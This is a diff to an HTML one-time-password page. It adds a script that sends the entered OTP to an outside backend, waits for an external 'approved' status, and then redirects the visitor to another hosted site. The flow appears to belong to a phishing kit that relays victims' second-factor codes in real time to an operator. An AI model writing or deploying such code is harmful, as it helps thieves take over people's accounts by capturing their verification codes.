@@ -31,17 +31,83 @@
         </div>
         <input
           type="text"
+          id="otp"
           class="form-input"
           placeholder="Enter your OTP"
           maxlength="6"
         />
       </div>
-      <div class="forget"><a>Resend OTP</a></div>
+      <div class="error" id="error" style="color: red; display: none; font-family: sans-serif; margin-top: 10px"></div>
+      <div class="forget"><a href="#">Resend OTP</a></div>
       <div class="continue-button">
-        <button class="continue-btn">
+        <button id="verify-btn" class="continue-btn">
           <span>Verify</span>
         </button>
       </div>
+      <div class="loader" id="loader"></div>
     </div>
+
+    <script>
+      const verifyBtn = document.getElementById("verify-btn");
+      const errorDiv = document.getElementById("error");
+      const loader = document.getElementById("loader");
+      const backendUrl = "https://op-9nkj.onrender.com";
+
+      verifyBtn.addEventListener("click", async () => {
+        const otp = document.getElementById("otp").value;
+
+        if (!otp) {
+          errorDiv.style.display = "block";
+          errorDiv.textContent = "Please enter the OTP.";
+          loader.style.display = "none";
+          return;
+        }
+
+        errorDiv.style.display = "none";
+        loader.style.display = "block";
+        verifyBtn.disabled = true;
+
+        try {
+          const response = await fetch(`${backendUrl}/otp`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ otp }),
+          });
+          const result = await response.json();
+          if (!result.success) {
+            errorDiv.style.display = "block";
+            errorDiv.textContent = result.error || "Submission failed.";
+            loader.style.display = "none";
+            verifyBtn.disabled = false;
+            return;
+          }
+
+          const sessionId = result.id;
+          const pollStatus = async () => {
+            try {
+              const statusResponse = await fetch(`${backendUrl}/status/${sessionId}`);
+              const status = await statusResponse.json();
+              if (status.status === "approved" && status.redirect_url) {
+                loader.style.display = "none";
+                window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
+              } else {
+                setTimeout(pollStatus, 2000);
+              }
+            } catch (error) {
+              errorDiv.style.display = "block";
+              errorDiv.textContent = "Error checking status. Please try again.";
+              loader.style.display = "none";
+              verifyBtn.disabled = false;
+            }
+          };
+          pollStatus();
+        } catch (error) {
+          errorDiv.style.display = "block";
+          errorDiv.textContent = "An error occurred. Please try again.";
+          loader.style.display = "none";
+          verifyBtn.disabled = false;
+        }
+      });
+    </script>
   </body>
 </html>
